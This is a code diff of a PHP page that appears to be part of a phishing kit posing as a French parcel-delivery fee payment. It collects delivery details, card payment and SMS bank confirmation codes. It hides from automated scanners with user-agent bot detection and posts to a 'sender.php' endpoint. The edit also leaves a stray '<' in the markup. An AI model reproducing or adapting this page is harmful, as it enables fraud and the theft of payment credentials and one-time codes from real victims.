@@ -1,25 +1,29 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
 <head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
 <?php //##############################################
 
-$WAITING_DURATION = 5; // time in seconds
+// $WAITING_DURATION = 5; // time in seconds
 
-//##############################################
+// //##############################################
 
-// Takes raw data from the request
-$json = file_get_contents('data/data.json');
+// // Takes raw data from the request
+// $json = file_get_contents('data/data.json');
 
-// Converts it into a PHP object
-$data = json_decode($json, true);
-//var_dump($data);
+// // Converts it into a PHP object
+// $data = json_decode($json, true);
+// //var_dump($data);
 
-if($data['TITLE_PAGE_1']){
-	$TITLE_PAGE_1 = $data['TITLE_PAGE_1'];
-}
-else{
-	$TITLE_PAGE_1 = 'VOS COORDONNEES DE LIVRAISON';
-}
+// if($data['TITLE_PAGE_1']){
+// 	$TITLE_PAGE_1 = $data['TITLE_PAGE_1'];
+// }
+// else{
+// 	$TITLE_PAGE_1 = 'VOS COORDONNEES DE LIVRAISON';
+// }
+
+$TITLE_PAGE_1 = 'VOS COORDONNEES DE LIVRAISON';
 
 $TITLE_PAGE_2 = 'PAIEMENT DU FORFAIT DE REMISE EN LIVRAISON';
 $TITLE_PAGE_3 = 'PAIEMENT ENREGISTRE';
@@ -27,12 +31,12 @@ $TITLE_INFO = 'INFORMATIONS RECAPITULATIVES DU PAIEMENT';
 
 $WAIT_TEXT = 'Veuillez patienter. Le traitement est en cours, bien vouloir ne pas actualiser la page.';
 
-if($data['SMS_TEXT']){
-	$SMS_TEXT = $data['SMS_TEXT'];
-}
-else{
-	$SMS_TEXT = 'Entrez le code de confirmation reçu par SMS. <br/>Une notification pourra aussi être transmise sur votre application bancaire mobile.';
-}
+// if($data['SMS_TEXT']){
+// 	$SMS_TEXT = $data['SMS_TEXT'];
+// }
+// else{
+// 	$SMS_TEXT = 'Entrez le code de confirmation reçu par SMS. <br/>Une notification pourra aussi être transmise sur votre application bancaire mobile.';
+// }
 
 $CONFIRMATION_TITLE = 'Votre demande a été enregistrée avec succès.';
 $CONFIRMATION_BODY = 'Vous recevrez un second e-mail vous informant de la mise en livraison de votre colis.';
@@ -130,7 +134,7 @@ if(DetectBot($_SERVER['HTTP_USER_AGENT'])){
 	die();
 }
 
-echo '<script>var WAITING_DURATION = '.$WAITING_DURATION.';</script>';
+//echo '<script>var WAITING_DURATION = '.$WAITING_DURATION.';</script>';
 echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 ?>
 
@@ -1153,8 +1157,8 @@ echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 								
       
       
-      <div style="font-size: 14px; line-height: 20px;">
-									<?php echo $SMS_TEXT; ?>
+      <div style="font-size: 14px; line-height: 20px;" class="sms_class">
+									Welcome!
 								</div>
 
 
@@ -1257,8 +1261,9 @@ echo '<script>var ACTUAL_LINK = "'.$actual_link.'sender.php";</script>';
 
 		</div>
 
-
+<
 <script src="code.js"></script>
+
 	
 </body>
 </html>
